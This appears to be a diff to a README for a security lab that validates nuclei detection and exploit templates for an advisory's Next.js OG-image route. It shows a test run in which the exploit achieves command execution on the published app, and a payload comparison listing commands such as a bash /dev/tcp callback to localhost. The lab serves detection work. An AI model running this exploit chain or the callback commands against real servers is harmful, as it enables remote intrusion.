@@ -25,6 +25,8 @@ lab/
 ├── oob-listener.py     catches the exploit's blind callback
 ├── app/                the test app (route + version endpoint + console)
 ├── check-upstream.sh   diff lab/app against the advisory's published app
+├── test-upstream-app.sh build the published app and run both templates on it
+├── compare-payload.sh  hash the template payload against exploit.py
 └── tools/
     ├── nuclei-shim.mjs offline runner for nuclei JS-protocol templates
     ├── http-fetch.mjs  one-shot HTTP helper used by the shim
@@ -69,6 +71,45 @@ OG route
   ok  value placed in SVG <title>      upstream=True  lab=True
 RESULT: lab/app matches the upstream victim app on everything that matters
 ```
+
+### The templates also ran against the published app itself
+
+`check-upstream.sh` compares sources; `test-upstream-app.sh` goes further and runs the
+templates against the advisory's own code, built here on the same Node 24.20.0 build:
+
+```bash
+$ ./test-upstream-app.sh
+[upstream] building the upstream app into run/upstream (next build, ~30s)
+[upstream] starting the upstream app on :3002
+  PASS upstream app serves /api/og on :3002
+[upstream] detection template against the upstream app
+  PASS detection matches the upstream app  (probe=2522895B control=21979B ratio=114.8)
+[upstream] exploit template against the upstream app (local callback)
+  PASS exploit matched (shim verdict: matched)
+  PASS callback carried the command output  (uid=1001(user) gid=1001(user) groups=1001(user),27(sudo),100(users))
+  PASS upstream app process was replaced by the chain
+  PASS upstream app serves again on :3002
+[upstream] summary: 6 passed, 0 failed
+```
+
+The detection numbers are identical to the lab replica (probe 2,522,895 B, ratio 114.8), which
+is what "the lab is the same target" is supposed to mean. Options: `--port`, `--oob-port`,
+`--repo DIR|URL`, `--skip-build`.
+
+### The payload is byte-identical to the reference builder
+
+The payload encodes the command, so equality has to be checked per command:
+
+```bash
+$ ./compare-payload.sh
+case   command                                     exploit.py           template             result
+1      id                                          7d54e9ae1b24907e     7d54e9ae1b24907e     identical (25284 B)
+2      bash -c 'id>/dev/tcp/127.0.0.1/4444'        cb55800f435d6522     cb55800f435d6522     identical (25286 B)
+3      71 x 'A' (the maximum command size)         1b9f3402d581306a     1b9f3402d581306a     identical (25284 B)
+RESULT: every payload is byte-identical to the reference builder
+```
+
+Add your own with `--command '...'` (repeatable); `--repo DIR` avoids a fresh clone.
 
 If you would rather scan the published image instead of this lab, build it and point the
 templates at it — the checks above are what the templates depend on, so the results transfer:
